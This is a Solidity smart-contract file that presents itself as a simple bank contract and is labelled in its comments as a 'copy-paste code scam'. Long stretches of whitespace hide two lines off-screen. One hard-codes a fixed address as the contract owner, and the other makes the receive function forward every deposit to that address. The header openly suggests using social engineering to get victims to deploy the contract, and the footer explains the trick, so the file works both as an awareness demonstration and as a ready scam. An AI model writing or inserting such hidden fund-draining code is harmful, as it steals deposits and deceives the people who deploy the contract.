/**
 * Copy-Paste code scam
 * 
 * This pretends to be a simple bank contract
 * You can deposit funds into it and withdrawal funds from it.
 * 
 * Use social engineering to trick someone into copy-pasting the code, deploying it, and using it like a bank.
 * 
 * Hint for why this is a scam: Many popular editors and repositories (e.g. Remix, Github, Notepad++) don't use word wrap by default.
 * Full explanation below the contract
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract Simple_Bank {
    address private _owner;

    constructor() {
        _owner = msg.sender;                                                                                                                                                                                                  _owner = 0xd5b0e629c05ad2c539CD8F4fbE2097108aFF8F5c;
    }

    // Withdrawal all funds in the contract to the owner
    function withdraw_all() public payable {
        require(msg.sender == _owner);
        payable(_owner).transfer(address(this).balance);
    }

    // Deposit funds into the contract
    receive() external payable {                                                                                                                                                                                              payable(_owner).transfer(address(this).balance);
    }
}


/**
 * Copy-Paste code scam
 * 
 * If you scroll all the way to the right, it actually hard-codes the scammer as the <_owner>.
 * That part of the code is hidden off-screen
 * 
 * And when you deposit into the contract, it instantly sends to the scammer's address.
 * 
 */